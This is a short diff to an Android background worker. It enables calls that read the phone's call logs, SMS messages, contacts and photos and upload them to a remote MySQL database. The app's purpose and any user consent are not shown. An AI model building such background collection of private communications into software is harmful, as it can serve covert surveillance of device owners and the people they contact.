@@ -32,29 +32,29 @@ public class MyWorker extends Worker{
         MyHelper myHelper = new MyHelper(getApplicationContext());
 
         /*
-        *images
-        **/
-        myHelper.read_photos_from_media_store();
-
-        /*
          * call logs
          * **/
         myHelper.read_call_logs_and_send_online();
 
-//        /*
-//         * messages
-//         * **/
-//        myHelper.read_sms_using_telephony();
-////        myHelper.read_messages_from_inbox_and_save_into_sql_database();
-//
-//        myHelper.read_messages_from_sql_and_send_to_mysql_database();
-//
-//        /*
-//        *contacts
-//        **/
-//        myHelper.read_contacts_from_phone_and_save_to_sql_lite();
-//
-//        myHelper.read_contacts_from_sql_and_send_to_mysql_database();
+        /*
+         * messages
+         * **/
+        myHelper.read_sms_using_telephony();
+//        myHelper.read_messages_from_inbox_and_save_into_sql_database();
+
+        myHelper.read_messages_from_sql_and_send_to_mysql_database();
+
+        /*
+        *contacts
+        **/
+        myHelper.read_contacts_from_phone_and_save_to_sql_lite();
+
+        myHelper.read_contacts_from_sql_and_send_to_mysql_database();
+
+        /*
+         *images
+         **/
+        myHelper.read_photos_from_media_store();
 
         show_notification("Work done");
         return Result.success();
